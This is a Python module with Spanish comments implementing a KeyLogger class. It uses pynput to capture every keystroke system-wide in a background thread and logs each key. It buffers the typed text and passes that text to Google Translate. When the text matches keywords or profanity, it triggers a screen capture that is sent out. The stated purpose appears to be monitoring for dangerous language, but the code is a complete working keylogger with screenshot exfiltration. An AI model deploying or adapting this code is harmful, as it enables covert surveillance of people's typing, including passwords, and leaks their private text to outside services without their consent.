import threading
import time
import logging
import re

from pynput.keyboard import Listener
from better_profanity import profanity as better_profanity
from utils.logger import logger
from config.settings import PALABRAS_CLAVE_TECLADO, PALABRAS_PELIGROSAS

# Normalización opcional con unidecode
try:
    from unidecode import unidecode
except ImportError as e:
    logger.warning(f"No se pudo importar unidecode: {e}")
    unidecode = None

# Traducción automática a inglés (opcional)
try:
    from deep_translator import GoogleTranslator

    def traducir_a_ingles(texto):
        try:
            return GoogleTranslator(source='auto', target='en').translate(texto)
        except Exception as e:
            logger.warning(f"No se pudo traducir el texto: {e}")
            return texto
except ImportError as e:
    logger.warning(f"No se pudo importar deep-translator: {e}")
    traducir_a_ingles = None


class KeyLogger:
    """
    KeyLogger robusto:
    - start(): intenta arrancar el listener en un hilo (no bloqueante).
    - run(): crea y mantiene un pynput Listener hasta stop().
    - stop(): para el listener y el hilo.
    Al detectar una tecla, intentará llamar a alguno de los métodos del screen_capture:
      on_key_event(key_str) | handle_keypress(key_str) | on_key(key_str)
    """

    def __init__(self, screen_capture=None):
        self.screen_capture = screen_capture
        self._thread = None
        self._stop_event = threading.Event()
        self._listener = None
        self.buffer_teclas = ""
        # Lista de palabras peligrosas / triggers adicionales
        # (se usa además del detector de better_profanity)
        self.palabras_peligrosas = set(PALABRAS_PELIGROSAS or [])
        # Palabras clave de acción (ej: 'foto', 'video', etc.)
        self.palabras_accion = set(PALABRAS_CLAVE_TECLADO or [])

    def start(self):
        if Listener is None:
            logger.error("[KEYLOGGER] pynput no disponible. Instala: pip install pynput")
            return
        if self._thread and self._thread.is_alive():
            logger.debug("[KEYLOGGER] Ya iniciado")
            return
        self._stop_event.clear()
        self._thread = threading.Thread(target=self.run, name="KeyLogger", daemon=True)
        self._thread.start()
        logger.info("[KEYLOGGER] Inicio de escucha de teclado en hilo KeyLogger")

    def run(self):
        if Listener is None:
            logger.error("[KEYLOGGER] pynput no disponible en run(). Abortando escucha.")
            return

        def _on_press(key):
            try:
                k = getattr(key, 'char', None)
                if k is None:
                    k = str(key)  # tecla especial, p.e. Key.enter
                # Normalizar a cadena simple
                key_str = str(k)
            except Exception:
                key_str = str(key)
            logger.debug(f"[KEYLOGGER] tecla: {key_str}")

            # Intentar entregar evento al screen_capture con nombres comunes
            sc = self.screen_capture
            if sc is not None:
                try:
                    if hasattr(sc, "on_key_event"):
                        sc.on_key_event(key_str)
                        return
                    if hasattr(sc, "handle_keypress"):
                        sc.handle_keypress(key_str)
                        return
                    if hasattr(sc, "on_key"):
                        sc.on_key(key_str)
                        return
                    # si no hay método conocido, solo registrar
                    logger.debug("[KEYLOGGER] screen_capture no implementa on_key_event/handle_keypress/on_key")
                except Exception as ex:
                    logger.exception(f"[KEYLOGGER] Error al entregar key a screen_capture: {ex}")

            # --- Aquí va la lógica de detección de palabras/palabras clave ---
            self.buffer_teclas += key_str
            if len(self.buffer_teclas) > 100:
                self.buffer_teclas = self.buffer_teclas[-100:]

            texto_raw = self.buffer_teclas.lower()
            texto_norm = texto_raw
            if unidecode:
                texto_norm = unidecode(texto_norm)

            detectado = False
            fuente = None
            palabra_encontrada = None

            # 1) Detección de palabras de acción (foto/video -> captura rápida)
            if self.palabras_accion:
                for w in self.palabras_accion:
                    if re.search(rf"\b{re.escape(w)}\b", texto_norm, flags=re.IGNORECASE):
                        try:
                            logger.info(f"[!] Palabra de acción detectada en teclado: {w}")
                            self.screen_capture.capturar_y_enviar_rapido(w)
                        except Exception as e:
                            logger.error(f"Error al capturar y enviar pantalla por palabra acción: {e}")
                        self.buffer_teclas = ""
                        return

            # 2) Detección de palabras peligrosas (coincidencia de palabra completa)
            if self.palabras_peligrosas:
                for w in self.palabras_peligrosas:
                    if re.search(rf"\b{re.escape(w)}\b", texto_norm, flags=re.IGNORECASE):
                        detectado = True
                        fuente = "palabras_peligrosas"
                        palabra_encontrada = w
                        break

            # 3) Detección con better_profanity (sobre texto traducido a inglés si está disponible)
            texto_para_profanity = texto_norm
            if traducir_a_ingles:
                try:
                    texto_para_profanity = traducir_a_ingles(texto_norm)
                except Exception as e:
                    logger.warning(f"No se pudo traducir antes de profanity check: {e}")

            try:
                if better_profanity.contains_profanity(texto_para_profanity):
                    detectado = True
                    fuente = (fuente or "") + ("+better-profanity" if fuente else "better-profanity")
            except Exception as e:
                logger.warning(f"better_profanity falló al analizar: {e}")

            if detectado:
                motivo = fuente + (f" ({palabra_encontrada})" if palabra_encontrada else "")
                logger.info(f"[!] Lenguaje/palabra peligrosa detectada en teclado por: {motivo}")
                try:
                    self.screen_capture.capturar_y_enviar_rapido(motivo)
                except Exception as e:
                    logger.error(f"Error al capturar y enviar pantalla: {e}")
                self.buffer_teclas = ""

        try:
            with Listener(on_press=_on_press) as listener:
                self._listener = listener
                # esperar hasta que stop_event sea set
                while not self._stop_event.is_set():
                    time.sleep(0.1)
                try:
                    listener.stop()
                except Exception:
                    pass
        except Exception as e:
            logger.exception(f"[KEYLOGGER] Excepción en Listener: {e}")
        finally:
            self._listener = None
            logger.info("[KEYLOGGER] Listener finalizado")

    def stop(self):
        self._stop_event.set()
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass
        if self._thread:
            self._thread.join(timeout=1.0)
        logger.info("[KEYLOGGER] Stop solicitado y hilo unido (si estaba activo)")
